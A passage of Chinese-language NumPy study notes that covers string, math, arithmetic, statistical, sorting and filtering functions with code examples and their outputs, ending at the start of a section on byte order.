['hello xyz']

连接示例：
['hello abc' 'hi xyz']
```

### 1-13-2 numpy.char.multiply()

numpy.char.multiply() 函数执行多重连接。

```python
import numpy as np 
 
print (np.char.multiply('Runoob ',3))
```

输出结果为：

```
Runoob Runoob Runoob 
```

### 1-13-3 numpy.char.center()

numpy.char.center() 函数用于将字符串居中，并使用指定字符在左侧和右侧进行填充。

```python
import numpy as np 
 
# np.char.center(str , width,fillchar) ：
# str: 字符串，width: 长度，fillchar: 填充字符
print (np.char.center('Runoob', 20,fillchar = '*'))
```

输出结果为：

```
*******Runoob*******
```

### 1-13-4 numpy.char.capitalize()

numpy.char.capitalize() 函数将字符串的第一个字母转换为大写：

```python
import numpy as np 
 
print (np.char.capitalize('runoob'))
```

输出结果为：

```
Runoob
```

### 1-13-5 numpy.char.title()

numpy.char.title() 函数将字符串的每个单词的第一个字母转换为大写：

```python
import numpy as np
 
print (np.char.title('i like runoob'))
```

输出结果为：

```
I Like Runoob
```

### 1-13-6 numpy.char.lower() 

函数对数组的每个元素转换为小写。它对每个元素调用 str.lower。

```python
import numpy as np 
 
#操作数组
print (np.char.lower(['RUNOOB','GOOGLE']))
 
# 操作字符串
print (np.char.lower('RUNOOB'))
```

输出结果为：

```
['runoob' 'google']
runoob
```

### 1-13-7 numpy.char.upper()

numpy.char.upper() 函数对数组的每个元素转换为大写。它对每个元素调用 str.upper。

```Python
import numpy as np 
 
#操作数组
print (np.char.upper(['runoob','google']))
 
# 操作字符串
print (np.char.upper('runoob'))
```

输出结果为：

```
['RUNOOB' 'GOOGLE']
RUNOOB
```

### 1-13-8 numpy.char.split()

numpy.char.split() 通过指定分隔符对字符串进行分割，并返回数组。默认情况下，分隔符为空格。

```python
import numpy as np 
 
# 分隔符默认为空格
print (np.char.split ('i like runoob?'))
# 分隔符为 .
print (np.char.split ('www.runoob.com', sep = '.'))
```

输出结果为：

```
['i', 'like', 'runoob?']
['www', 'runoob', 'com']
```

### 1-13-9 numpy.char.splitlines()

numpy.char.splitlines() 函数以换行符作为分隔符来分割字符串，并返回数组。

```python
import numpy as np 
 
# 换行符 \n
print (np.char.splitlines('i\nlike runoob?')) 
print (np.char.splitlines('i\rlike runoob?'))
```

输出结果为：

```
['i', 'like runoob?']
['i', 'like runoob?']
```

**\n**，**\r**，**\r\n** 都可用作换行符。

### 1-13-10 numpy.char.strip()

numpy.char.strip() 函数用于移除开头或结尾处的特定字符。

```python
import numpy as np 
 
# 移除字符串头尾的 a 字符
print (np.char.strip('ashok arunooba','a'))
 
# 移除数组元素头尾的 a 字符
print (np.char.strip(['arunooba','admin','java'],'a'))
```

输出结果为：

```
shok arunoob
['runoob' 'dmin' 'jav']
```

### 1-13-11 numpy.char.join()

numpy.char.join() 函数通过指定分隔符来连接数组中的元素或字符串

```python
import numpy as np 
 
# 操作字符串
print (np.char.join(':','runoob'))
 
# 指定多个分隔符操作数组元素
print (np.char.join([':','-'],['runoob','google']))
```

输出结果为：

```
r:u:n:o:o:b
['r:u:n:o:o:b' 'g-o-o-g-l-e']
```

### 1-13-12 numpy.char.replace()

numpy.char.replace() 函数使用新字符串替换字符串中的所有子字符串。

```python
import numpy as np 
 
print (np.char.replace ('i like runoob', 'oo', 'cc'))
```

输出结果为：

```
i like runccb
```

### 1-13-13 numpy.char.encode()

numpy.char.encode() 函数对数组中的每个元素调用 str.encode 函数。 默认编码是 utf-8，可以使用标准 Python 库中的编解码器。

```python
import numpy as np 
 
a = np.char.encode('runoob', 'cp500') 
print (a)
```

输出结果为：

```
b'\x99\xa4\x95\x96\x96\x82'
```

### 1-13-14 numpy.char.decode()

numpy.char.decode() 函数对编码的元素进行 str.decode() 解码。

```python
import numpy as np 
 
a = np.char.encode('runoob', 'cp500') 
print (a)
print (np.char.decode(a,'cp500'))
```

```python
b'\x99\xa4\x95\x96\x96\x82'
runoob
```

## 1-14 NumPy 数学函数

### 1-14-1 三角函数

NumPy 提供了标准的三角函数：sin()、cos()、tan()。

```python
import numpy as np
 
a = np.array([0,30,45,60,90])
print ('不同角度的正弦值：')
# 通过乘 pi/180 转化为弧度  
print (np.sin(a*np.pi/180))
print ('\n')
print ('数组中角度的余弦值：')
print (np.cos(a*np.pi/180))
print ('\n')
print ('数组中角度的正切值：')
print (np.tan(a*np.pi/180))
```

输出结果为：

```
不同角度的正弦值：
[0.         0.5        0.70710678 0.8660254  1.        ]


数组中角度的余弦值：
[1.00000000e+00 8.66025404e-01 7.07106781e-01 5.00000000e-01
 6.12323400e-17]


数组中角度的正切值：
[0.00000000e+00 5.77350269e-01 1.00000000e+00 1.73205081e+00
 1.63312394e+16]
```

arcsin，arccos，和 arctan 函数返回给定角度的 sin，cos 和 tan 的反三角函数。

这些函数的结果可以通过 numpy.degrees() 函数将弧度转换为角度。

```python
import numpy as np
 
a = np.array([0,30,45,60,90])  
print ('含有正弦值的数组：')
sin = np.sin(a*np.pi/180)  
print (sin)
print ('\n')
print ('计算角度的反正弦，返回值以弧度为单位：')
inv = np.arcsin(sin)  
print (inv)
print ('\n')
print ('通过转化为角度制来检查结果：')
print (np.degrees(inv))
print ('\n')
print ('arccos 和 arctan 函数行为类似：')
cos = np.cos(a*np.pi/180)  
print (cos)
print ('\n')
print ('反余弦：')
inv = np.arccos(cos)  
print (inv)
print ('\n')
print ('角度制单位：')
print (np.degrees(inv))
print ('\n')
print ('tan 函数：')
tan = np.tan(a*np.pi/180)  
print (tan)
print ('\n')
print ('反正切：')
inv = np.arctan(tan)  
print (inv)
print ('\n')
print ('角度制单位：')
print (np.degrees(inv))
```

输出结果为：

```
含有正弦值的数组：
[0.         0.5        0.70710678 0.8660254  1.        ]


计算角度的反正弦，返回值以弧度为单位：
[0.         0.52359878 0.78539816 1.04719755 1.57079633]


通过转化为角度制来检查结果：
[ 0. 30. 45. 60. 90.]


arccos 和 arctan 函数行为类似：
[1.00000000e+00 8.66025404e-01 7.07106781e-01 5.00000000e-01
 6.12323400e-17]


反余弦：
[0.         0.52359878 0.78539816 1.04719755 1.57079633]


角度制单位：
[ 0. 30. 45. 60. 90.]


tan 函数：
[0.00000000e+00 5.77350269e-01 1.00000000e+00 1.73205081e+00
 1.63312394e+16]


反正切：
[0.         0.52359878 0.78539816 1.04719755 1.57079633]


角度制单位：
[ 0. 30. 45. 60. 90.]
```

### 1-14-2 舍入函数

#### 2-1 **numpy.around() **

函数返回指定数字的四舍五入值。

```
numpy.around(a,decimals)
```

参数说明：

- a: 数组
- decimals: 舍入的小数位数。 默认值为0。 如果为负，整数将四舍五入到小数点左侧的位置

```python
import numpy as np
 
a = np.array([1.0,5.55,  123,  0.567,  25.532])  
print  ('原数组：')
print (a)
print ('\n')
print ('舍入后：')
print (np.around(a))
print (np.around(a, decimals =  1))
print (np.around(a, decimals =  -1))
```

输出结果为：

```
原数组：
[  1.      5.55  123.      0.567  25.532]


舍入后：
[  1.   6. 123.   1.  26.]
[  1.    5.6 123.    0.6  25.5]
[  0.  10. 120.   0.  30.]
```

#### 2-2 **numpy.floor()**

numpy.floor() 返回小于或者等于指定表达式的最大整数，即向下取整。

```python
import numpy as np
 
a = np.array([-1.7,  1.5,  -0.2,  0.6,  10])
print ('提供的数组：')
print (a)
print ('\n')
print ('修改后的数组：')
print (np.floor(a))
```

输出结果为：

```
提供的数组：
[-1.7  1.5 -0.2  0.6 10. ]


修改后的数组：
[-2.  1. -1.  0. 10.]
```

#### 2-3 numpy.ceil()

numpy.ceil() 返回大于或者等于指定表达式的最小整数，即向上取整。

```python
import numpy as np
 
a = np.array([-1.7,  1.5,  -0.2,  0.6,  10])  
print  ('提供的数组：')
print (a)
print ('\n')
print ('修改后的数组：')
print (np.ceil(a))
```

输出结果为：

```
提供的数组：
[-1.7  1.5 -0.2  0.6 10. ]


修改后的数组：
[-1.  2. -0.  1. 10.]
```

## 1-15 NumPy 算术函数

NumPy 算术函数包含简单的加减乘除: **add()**，**subtract()**，**multiply()** 和 **divide()**。

需要注意的是数组必须具有相同的形状或符合数组广播规则。

```python
import numpy as np 
 
a = np.arange(9, dtype = np.float_).reshape(3,3)  
print ('第一个数组：')
print (a)
print ('\n')
print ('第二个数组：')
b = np.array([10,10,10])  
print (b)
print ('\n')
print ('两个数组相加：')
print (np.add(a,b))
print ('\n')
print ('两个数组相减：')
print (np.subtract(a,b))
print ('\n')
print ('两个数组相乘：')
print (np.multiply(a,b))
print ('\n')
print ('两个数组相除：')
print (np.divide(a,b))
```

输出结果为：

```
第一个数组：
[[0. 1. 2.]
 [3. 4. 5.]
 [6. 7. 8.]]


第二个数组：
[10 10 10]


两个数组相加：
[[10. 11. 12.]
 [13. 14. 15.]
 [16. 17. 18.]]


两个数组相减：
[[-10.  -9.  -8.]
 [ -7.  -6.  -5.]
 [ -4.  -3.  -2.]]


两个数组相乘：
[[ 0. 10. 20.]
 [30. 40. 50.]
 [60. 70. 80.]]


两个数组相除：
[[0.  0.1 0.2]
 [0.3 0.4 0.5]
 [0.6 0.7 0.8]]
```

此外 Numpy 也包含了其他重要的算术函数。

### 1-15-1 numpy.reciprocal()

numpy.reciprocal() 函数返回参数逐元素的倒数。如 **1/4** 倒数为 **4/1**。

```python
import numpy as np 
 
a = np.array([0.25,  1.33,  1,  100])  
print ('我们的数组是：')
print (a)
print ('\n')
print ('调用 reciprocal 函数：')
print (np.reciprocal(a))
```

输出结果为：

```
我们的数组是：
[  0.25   1.33   1.   100.  ]


调用 reciprocal 函数：
[4.        0.7518797 1.        0.01     ]
```

### 1-15-2 numpy.power()

numpy.power() 函数将第一个输入数组中的元素作为底数，计算它与第二个输入数组中相应元素的幂。

```python
import numpy as np 
 
a = np.array([10,100,1000])  
print ('我们的数组是；')
print (a)
print ('\n') 
print ('调用 power 函数：')
print (np.power(a,2))
print ('\n')
print ('第二个数组：')
b = np.array([1,2,3])  
print (b)
print ('\n')
print ('再次调用 power 函数：')
print (np.power(a,b))
```

输出结果为：

```
我们的数组是；
[  10  100 1000]


调用 power 函数：
[    100   10000 1000000]


第二个数组：
[1 2 3]


再次调用 power 函数：
[        10      10000 1000000000]
```

### 1-15-3 numpy.mod()

numpy.mod() 计算输入数组中相应元素的相除后的余数。 函数 numpy.remainder() 也产生相同的结果。

```python
import numpy as np
 
a = np.array([10,20,30]) 
b = np.array([3,5,7])  
print ('第一个数组：')
print (a)
print ('\n')
print ('第二个数组：')
print (b)
print ('\n')
print ('调用 mod() 函数：')
print (np.mod(a,b))
print ('\n')
print ('调用 remainder() 函数：')
print (np.remainder(a,b))
```

输出结果为：

```
第一个数组：
[10 20 30]


第二个数组：
[3 5 7]


调用 mod() 函数：
[1 0 2]


调用 remainder() 函数：
[1 0 2]
```

## 1-16 NumPy 统计函数

NumPy 提供了很多统计函数，用于从数组中查找最小元素，最大元素，百分位标准差和方差等。

### 1-16-1 numpy.amin() 和 numpy.amax()

numpy.amin() 用于计算数组中的元素沿指定轴的最小值。

```
numpy.amin(a, axis=None, out=None, keepdims=<no value>, initial=<no value>, where=<no value>)
```

参数说明：

- `a`: 输入的数组，可以是一个NumPy数组或类似数组的对象。
- `axis`: 可选参数，用于指定在哪个轴上计算最小值。如果不提供此参数，则返回整个数组的最小值。可以是一个整数表示轴的索引，也可以是一个元组表示多个轴。
- `out`: 可选参数，用于指定结果的存储位置。
- `keepdims`: 可选参数，如果为True，将保持结果数组的维度数目与输入数组相同。如果为False（默认值），则会去除计算后维度为1的轴。
- `initial`: 可选参数，用于指定一个初始值，然后在数组的元素上计算最小值。
- `where`: 可选参数，一个布尔数组，用于指定仅考虑满足条件的元素。

numpy.amax() 用于计算数组中的元素沿指定轴的最大值。

```
numpy.amax(a, axis=None, out=None, keepdims=<no value>, initial=<no value>, where=<no value>)
```

参数说明：

- `a`: 输入的数组，可以是一个NumPy数组或类似数组的对象。
- `axis`: 可选参数，用于指定在哪个轴上计算最大值。如果不提供此参数，则返回整个数组的最大值。可以是一个整数表示轴的索引，也可以是一个元组表示多个轴。
- `out`: 可选参数，用于指定结果的存储位置。
- `keepdims`: 可选参数，如果为True，将保持结果数组的维度数目与输入数组相同。如果为False（默认值），则会去除计算后维度为1的轴。
- `initial`: 可选参数，用于指定一个初始值，然后在数组的元素上计算最大值。
- `where`: 可选参数，一个布尔数组，用于指定仅考虑满足条件的元素。

```python
import numpy as np 
 
a = np.array([[3,7,5],[8,4,3],[2,4,9]])  
print ('我们的数组是：')
print (a)
print ('\n')
print ('调用 amin() 函数：')
print (np.amin(a,1))
print ('\n')
print ('再次调用 amin() 函数：')
print (np.amin(a,0))
print ('\n')
print ('调用 amax() 函数：')
print (np.amax(a))
print ('\n')
print ('再次调用 amax() 函数：')
print (np.amax(a, axis =  0))
```

输出结果为：

```
我们的数组是：
[[3 7 5]
 [8 4 3]
 [2 4 9]]


调用 amin() 函数：
[3 3 2]


再次调用 amin() 函数：
[2 4 3]


调用 amax() 函数：
9


再次调用 amax() 函数：
[8 7 9]
```

### 1-16-2 numpy.ptp()

**numpy.ptp()** 函数计算数组中元素最大值与最小值的差（最大值 - 最小值）。

```
numpy.ptp(a, axis=None, out=None, keepdims=<no value>, initial=<no value>, where=<no value>)
```

参数说明：

- `a`: 输入的数组，可以是一个 NumPy 数组或类似数组的对象。
- `axis`: 可选参数，用于指定在哪个轴上计算峰-峰值。如果不提供此参数，则返回整个数组的峰-峰值。可以是一个整数表示轴的索引，也可以是一个元组表示多个轴。
- `out`: 可选参数，用于指定结果的存储位置。
- `keepdims`: 可选参数，如果为 True，将保持结果数组的维度数目与输入数组相同。如果为 False（默认值），则会去除计算后维度为1的轴。
- `initial`: 可选参数，用于指定一个初始值，然后在数组的元素上计算峰-峰值。
- `where`: 可选参数，一个布尔数组，用于指定仅考虑满足条件的元素。

```python
import numpy as np 
 
a = np.array([[3,7,5],[8,4,3],[2,4,9]])  
print ('我们的数组是：')
print (a)
print ('\n')
print ('调用 ptp() 函数：')
print (np.ptp(a))
print ('\n')
print ('沿轴 1 调用 ptp() 函数：')
print (np.ptp(a, axis =  1))
print ('\n')
print ('沿轴 0 调用 ptp() 函数：')
print (np.ptp(a, axis =  0))
```

输出结果为：

```
我们的数组是：
[[3 7 5]
 [8 4 3]
 [2 4 9]]


调用 ptp() 函数：
7


沿轴 1 调用 ptp() 函数：
[4 5 7]


沿轴 0 调用 ptp() 函数：
[6 3 6]
```

### 1-16-3 numpy.percentile()

百分位数是统计中使用的度量，表示小于这个值的观察值的百分比。 函数numpy.percentile()接受以下参数。

```
numpy.percentile(a, q, axis)
```

参数说明：

- a: 输入数组
- q: 要计算的百分位数，在 0 ~ 100 之间
- axis: 沿着它计算百分位数的轴

**首先明确百分位数：**

第 p 个百分位数是这样一个值，它使得至少有 p% 的数据项小于或等于这个值，且至少有 (100-p)% 的数据项大于或等于这个值。

举个例子：高等院校的入学考试成绩经常以百分位数的形式报告。比如，假设某个考生在入学考试中的语文部分的原始分数为 54 分。相对于参加同一考试的其他学生来说，他的成绩如何并不容易知道。但是如果原始分数54分恰好对应的是第70百分位数，我们就能知道大约70%的学生的考分比他低，而约30%的学生考分比他高。

这里的 p = 70。

```python
import numpy as np 
 
a = np.array([[10, 7, 4], [3, 2, 1]])
print ('我们的数组是：')
print (a)
 
print ('调用 percentile() 函数：')
# 50% 的分位数，就是 a 里排序之后的中位数
print (np.percentile(a, 50)) 
 
# axis 为 0，在纵列上求
print (np.percentile(a, 50, axis=0)) 
 
# axis 为 1，在横行上求
print (np.percentile(a, 50, axis=1)) 
 
# 保持维度不变
print (np.percentile(a, 50, axis=1, keepdims=True))
```

输出结果为：

```
我们的数组是：
[[10  7  4]
 [ 3  2  1]]
调用 percentile() 函数：
3.5
[6.5 4.5 2.5]
[7. 2.]
[[7.]
 [2.]]
```

### 1-16-4 numpy.median()

numpy.median() 函数用于计算数组 a 中元素的中位数（中值）

```
numpy.median(a, axis=None, out=None, overwrite_input=False, keepdims=<no value>)
```

参数说明：

- `a`: 输入的数组，可以是一个 NumPy 数组或类似数组的对象。
- `axis`: 可选参数，用于指定在哪个轴上计算中位数。如果不提供此参数，则计算整个数组的中位数。可以是一个整数表示轴的索引，也可以是一个元组表示多个轴。
- `out`: 可选参数，用于指定结果的存储位置。
- `overwrite_input`: 可选参数，如果为True，则允许在计算中使用输入数组的内存。这可能会在某些情况下提高性能，但可能会修改输入数组的内容。
- `keepdims`: 可选参数，如果为True，将保持结果数组的维度数目与输入数组相同。如果为False（默认值），则会去除计算后维度为1的轴。

```python
import numpy as np 
 
a = np.array([[30,65,70],[80,95,10],[50,90,60]])  
print ('我们的数组是：')
print (a)
print ('\n')
print ('调用 median() 函数：')
print (np.median(a))
print ('\n')
print ('沿轴 0 调用 median() 函数：')
print (np.median(a, axis =  0))
print ('\n')
print ('沿轴 1 调用 median() 函数：')
print (np.median(a, axis =  1))
```

输出结果为：

```
我们的数组是：
[[30 65 70]
 [80 95 10]
 [50 90 60]]


调用 median() 函数：
65.0


沿轴 0 调用 median() 函数：
[50. 90. 60.]


沿轴 1 调用 median() 函数：
[65. 80. 60.]
```

### 1-16-5 numpy.mean()

numpy.mean() 函数返回数组中元素的算术平均值，如果提供了轴，则沿其计算。

算术平均值是沿轴的元素的总和除以元素的数量。

```
numpy.mean(a, axis=None, dtype=None, out=None, keepdims=<no value>)
```

参数说明：

- `a`: 输入的数组，可以是一个 NumPy 数组或类似数组的对象。
- `axis`: 可选参数，用于指定在哪个轴上计算平均值。如果不提供此参数，则计算整个数组的平均值。可以是一个整数表示轴的索引，也可以是一个元组表示多个轴。
- `dtype`: 可选参数，用于指定输出的数据类型。如果不提供，则根据输入数据的类型选择合适的数据类型。
- `out`: 可选参数，用于指定结果的存储位置。
- `keepdims`: 可选参数，如果为True，将保持结果数组的维度数目与输入数组相同。如果为False（默认值），则会去除计算后维度为1的轴。

```python
import numpy as np 
 
a = np.array([[1,2,3],[3,4,5],[4,5,6]])  
print ('我们的数组是：')
print (a)
print ('\n')
print ('调用 mean() 函数：')
print (np.mean(a))
print ('\n')
print ('沿轴 0 调用 mean() 函数：')
print (np.mean(a, axis =  0))
print ('\n')
print ('沿轴 1 调用 mean() 函数：')
print (np.mean(a, axis =  1))
```

输出结果为：

```
我们的数组是：
[[1 2 3]
 [3 4 5]
 [4 5 6]]


调用 mean() 函数：
3.6666666666666665


沿轴 0 调用 mean() 函数：
[2.66666667 3.66666667 4.66666667]


沿轴 1 调用 mean() 函数：
[2. 4. 5.]
```

### 1-16-6 numpy.average()

numpy.average() 函数根据在另一个数组中给出的各自的权重计算数组中元素的加权平均值。

该函数可以接受一个轴参数。 如果没有指定轴，则数组会被展开。

加权平均值即将各数值乘以相应的权数，然后加总求和得到总体值，再除以总的单位数。

考虑数组[1,2,3,4]和相应的权重[4,3,2,1]，通过将相应元素的乘积相加，并将和除以权重的和，来计算加权平均值。

```
加权平均值 = (1*4+2*3+3*2+4*1)/(4+3+2+1)
```

函数语法：

```
numpy.average(a, axis=None, weights=None, returned=False)
```

参数说明：

- `a`: 输入的数组，可以是一个 NumPy 数组或类似数组的对象。
- `axis`: 可选参数，用于指定在哪个轴上计算加权平均值。如果不提供此参数，则计算整个数组的加权平均值。可以是一个整数表示轴的索引，也可以是一个元组表示多个轴。
- `weights`: 可选参数，用于指定对应数据点的权重。如果不提供权重数组，则默认为等权重。
- `returned`: 可选参数，如果为True，将同时返回加权平均值和权重总和。

```python
import numpy as np 
 
a = np.array([1,2,3,4])  
print ('我们的数组是：')
print (a)
print ('\n')
print ('调用 average() 函数：')
print (np.average(a))
print ('\n')
# 不指定权重时相当于 mean 函数
wts = np.array([4,3,2,1])  
print ('再次调用 average() 函数：')
print (np.average(a,weights = wts))
print ('\n')
# 如果 returned 参数设为 true，则返回权重的和  
print ('权重的和：')
print (np.average([1,2,3,  4],weights =  [4,3,2,1], returned =  True))
```

输出结果为：

```
我们的数组是：
[1 2 3 4]


调用 average() 函数：
2.5


再次调用 average() 函数：
2.0


权重的和：
(2.0, 10.0)
```

在多维数组中，可以指定用于计算的轴。

```python
import numpy as np 
 
a = np.arange(6).reshape(3,2)  
print ('我们的数组是：')
print (a)
print ('\n')
print ('修改后的数组：')
wt = np.array([3,5])  
print (np.average(a, axis =  1, weights = wt))
print ('\n')
print ('修改后的数组：')
print (np.average(a, axis =  1, weights = wt, returned =  True))
```

输出结果为：

```
我们的数组是：
[[0 1]
 [2 3]
 [4 5]]


修改后的数组：
[0.625 2.625 4.625]


修改后的数组：
(array([0.625, 2.625, 4.625]), array([8., 8., 8.]))
```

### 1-16-7 标准差

标准差是一组数据平均值分散程度的一种度量。

标准差是方差的算术平方根。

标准差公式如下：

```
std = sqrt(mean((x - x.mean())**2))
```

如果数组是 [1，2，3，4]，则其平均值为 2.5。 因此，差的平方是 [2.25,0.25,0.25,2.25]，并且再求其平均值的平方根除以 4，即 sqrt(5/4) ，结果为 1.1180339887498949。

### 1-16-8 实例

import numpy as np   print (np.std([1,2,3,4]))

输出结果为：

```
1.1180339887498949
```

#### 8-1 方差

统计中的方差（样本方差）是每个样本值与全体样本值的平均数之差的平方值的平均数，即 mean((x - x.mean())** 2)。

换句话说，标准差是方差的平方根。

#### 8-2 实例

```python
import numpy as np
 
print (np.var([1,2,3,4]))
```

输出结果为：

```
1.25
```

## 1-17 NumPy 排序、条件筛选函数

NumPy 提供了多种排序的方法。 这些排序函数实现不同的排序算法，每个排序算法的特征在于执行速度，最坏情况性能，所需的工作空间和算法的稳定性。 下表显示了三种排序算法的比较。

![image-20240420201644893](Python超详细的学习笔记（3.0）.assets/image-20240420201644893.png)

### 1-17-1 numpy.sort()

numpy.sort() 函数返回输入数组的排序副本。函数格式如下：

```
numpy.sort(a, axis, kind, order)
```

参数说明：

- a: 要排序的数组
- axis: 沿着它排序数组的轴，如果没有数组会被展开，沿着最后的轴排序， axis=0 按列排序，axis=1 按行排序
- kind: 默认为'quicksort'（快速排序）
- order: 如果数组包含字段，则是要排序的字段

```python
import numpy as np  
 
a = np.array([[3,7],[9,1]])  
print ('我们的数组是：')
print (a)
print ('\n')
print ('调用 sort() 函数：')
print (np.sort(a))
print ('\n')
print ('按列排序：')
print (np.sort(a, axis =  0))
print ('\n')
# 在 sort 函数中排序字段 
dt = np.dtype([('name',  'S10'),('age',  int)]) 
a = np.array([("raju",21),("anil",25),("ravi",  17),  ("amar",27)], dtype = dt)  
print ('我们的数组是：')
print (a)
print ('\n')
print ('按 name 排序：')
print (np.sort(a, order =  'name'))
```

输出结果为：

```
我们的数组是：
[[3 7]
 [9 1]]


调用 sort() 函数：
[[3 7]
 [1 9]]


按列排序：
[[3 1]
 [9 7]]


我们的数组是：
[(b'raju', 21) (b'anil', 25) (b'ravi', 17) (b'amar', 27)]


按 name 排序：
[(b'amar', 27) (b'anil', 25) (b'raju', 21) (b'ravi', 17)]
```

### 1-17-2 numpy.argsort()

numpy.argsort() 函数返回的是数组值从小到大的索引值。

```python
import numpy as np 
 
x = np.array([3,  1,  2])  
print ('我们的数组是：')
print (x)
print ('\n')
print ('对 x 调用 argsort() 函数：')
y = np.argsort(x)  
print (y)
print ('\n')
print ('以排序后的顺序重构原数组：')
print (x[y])
print ('\n')
print ('使用循环重构原数组：')
for i in y:  
    print (x[i], end=" ")
```

输出结果为：

```
我们的数组是：
[3 1 2]


对 x 调用 argsort() 函数：
[1 2 0]


以排序后的顺序重构原数组：
[1 2 3]


使用循环重构原数组

1 2 3
```

### 1-17-3 numpy.lexsort()

numpy.lexsort() 用于对多个序列进行排序。把它想象成对电子表格进行排序，每一列代表一个序列，排序时优先照顾靠后的列。

这里举一个应用场景：小升初考试，重点班录取学生按照总成绩录取。在总成绩相同时，数学成绩高的优先录取，在总成绩和数学成绩都相同时，按照英语成绩录取…… 这里，总成绩排在电子表格的最后一列，数学成绩在倒数第二列，英语成绩在倒数第三列。

```python
import numpy as np 
 
nm =  ('raju','anil','ravi','amar') 
dv =  ('f.y.',  's.y.',  's.y.',  'f.y.') 
ind = np.lexsort((dv,nm))  
print ('调用 lexsort() 函数：') 
print (ind) 
print ('\n') 
print ('使用这个索引来获取排序后的数据：') 
print ([nm[i]  +  ", "  + dv[i]  for i in ind])
```

输出结果为：

```python
调用 lexsort() 函数：
[3 1 0 2]


使用这个索引来获取排序后的数据：
['amar, f.y.', 'anil, s.y.', 'raju, f.y.', 'ravi, s.y.']
```

上面传入 np.lexsort 的是一个tuple，排序时首先排 nm，顺序为：amar、anil、raju、ravi 。综上排序结果为 [3 1 0 2]。

### 1-17-4 msort、sort_complex、partition、argpartition

![image-20240420201828367](Python超详细的学习笔记（3.0）.assets/image-20240420201828367.png)

复数排序：

```python
>>> import numpy as np
>>> np.sort_complex([5, 3, 6, 2, 1])
array([ 1.+0.j,  2.+0.j,  3.+0.j,  5.+0.j,  6.+0.j])
>>>
>>> np.sort_complex([1 + 2j, 2 - 1j, 3 - 2j, 3 - 3j, 3 + 5j])
array([ 1.+2.j,  2.-1.j,  3.-3.j,  3.-2.j,  3.+5.j])
```

partition() 分区排序：

```python
>>> a = np.array([3, 4, 2, 1])
>>> np.partition(a, 3)  # 将数组 a 中所有元素（包括重复元素）从小到大排列，3 表示的是排序数组索引为 3 的数字，比该数字小的排在该数字前面，比该数字大的排在该数字的后面
array([2, 1, 3, 4])
>>>
>>> np.partition(a, (1, 3)) # 小于 1 的在前面，大于 3 的在后面，1和3之间的在中间
array([1, 2, 3, 4])
```

找到数组的第 3 小（index=2）的值和第 2 大（index=-2）的值

```python
>>> arr = np.array([46, 57, 23, 39, 1, 10, 0, 120])
>>> arr[np.argpartition(arr, 2)[2]]
10
>>> arr[np.argpartition(arr, -2)[-2]]
57
```

同时找到第 3 和第 4 小的值。注意这里，用 [2,3] 同时将第 3 和第 4 小的排序好，然后可以分别通过下标 [2] 和 [3] 取得。

```python
>>> arr[np.argpartition(arr, [2,3])[2]]
10
>>> arr[np.argpartition(arr, [2,3])[3]]
23
```

### 1-17-5 numpy.argmax() 和 numpy.argmin()

numpy.argmax() 和 numpy.argmin()函数分别沿给定轴返回最大和最小元素的索引。

```Python
import numpy as np 
 
a = np.array([[30,40,70],[80,20,10],[50,90,60]])  
print  ('我们的数组是：') 
print (a) 
print ('\n') 
print ('调用 argmax() 函数：') 
print (np.argmax(a)) 
print ('\n') 
print ('展开数组：') 
print (a.flatten()) 
print ('\n') 
print ('沿轴 0 的最大值索引：') 
maxindex = np.argmax(a, axis =  0)  
print (maxindex) 
print ('\n') 
print ('沿轴 1 的最大值索引：') 
maxindex = np.argmax(a, axis =  1)  
print (maxindex) 
print ('\n') 
print ('调用 argmin() 函数：') 
minindex = np.argmin(a)  
print (minindex) 
print ('\n') 
print ('展开数组中的最小值：') 
print (a.flatten()[minindex]) 
print ('\n') 
print ('沿轴 0 的最小值索引：') 
minindex = np.argmin(a, axis =  0)  
print (minindex) 
print ('\n') 
print ('沿轴 1 的最小值索引：') 
minindex = np.argmin(a, axis =  1)  
print (minindex)
```

输出结果为：

```
我们的数组是：
[[30 40 70]
 [80 20 10]
 [50 90 60]]


调用 argmax() 函数：
7


展开数组：
[30 40 70 80 20 10 50 90 60]


沿轴 0 的最大值索引：
[1 2 0]


沿轴 1 的最大值索引：
[2 0 1]


调用 argmin() 函数：
5


展开数组中的最小值：
10


沿轴 0 的最小值索引：
[0 1 1]


沿轴 1 的最小值索引：
[0 2 0]
```

### 1-17-6 numpy.nonzero()

numpy.nonzero() 函数返回输入数组中非零元素的索引。

```python
import numpy as np 
 
a = np.array([[30,40,0],[0,20,10],[50,0,60]])  
print ('我们的数组是：')
print (a)
print ('\n')
print ('调用 nonzero() 函数：')
print (np.nonzero (a))
```

输出结果为：

```
我们的数组是：
[[30 40  0]
 [ 0 20 10]
 [50  0 60]]


调用 nonzero() 函数：
(array([0, 0, 1, 1, 2, 2]), array([0, 1, 1, 2, 0, 2]))
```

### 1-17-7 numpy.where()

numpy.where() 函数返回输入数组中满足给定条件的元素的索引。

```python
import numpy as np 
 
x = np.arange(9.).reshape(3,  3)  
print ('我们的数组是：')
print (x)
print ( '大于 3 的元素的索引：')
y = np.where(x >  3)  
print (y)
print ('使用这些索引来获取满足条件的元素：')
print (x[y])
```

输出结果为：

```
我们的数组是：
[[0. 1. 2.]
 [3. 4. 5.]
 [6. 7. 8.]]
大于 3 的元素的索引：
(array([1, 1, 2, 2, 2]), array([1, 2, 0, 1, 2]))
使用这些索引来获取满足条件的元素：
[4. 5. 6. 7. 8.]
```

### 1-17-8 numpy.extract()

numpy.extract() 函数根据某个条件从数组中抽取元素，返回满条件的元素。

```python
import numpy as np 
 
x = np.arange(9.).reshape(3,  3)  
print ('我们的数组是：')
print (x)
# 定义条件, 选择偶数元素
condition = np.mod(x,2)  ==  0  
print ('按元素的条件值：')
print (condition)
print ('使用条件提取元素：')
print (np.extract(condition, x))
```

输出结果为：

```
我们的数组是：
[[0. 1. 2.]
 [3. 4. 5.]
 [6. 7. 8.]]
按元素的条件值：
[[ True False  True]
 [False  True False]
 [ True False  True]]
使用条件提取元素：
[0. 2. 4. 6. 8.]
```

## 1-18 NumPy 字节交换

在几乎所有的机器上，多字节对象都被存储为连续的字节序列。字节顺序，是跨越多字节的程序对象的存储规则。

- **大端模式：**指数据的高字节保存在内存的低地址中，而数据的低字节保存在内存的高地址中，这样的存储模式有点儿类似于把数据当作字符串顺序处理：地址由小向大增加，而数据从高位往低位放；这和我们的阅读习惯一致。
- **小端模式：**指数据的高字节保存在内存的高地址中，而数据的低字节保存在内存的低地址中，这种存储模式将地址的高低和数据位权有效地结合起来，高地址部分权值高，低地址部分权值低。

例如在 C 语言中，一个类型为 int 的变量 x 地址为 0x100，那么其对应地址表达式&x的值为 0x100。且x的四个字节将被存储在存储器的 0x100, 0x101, 0x102, 0x103位置。

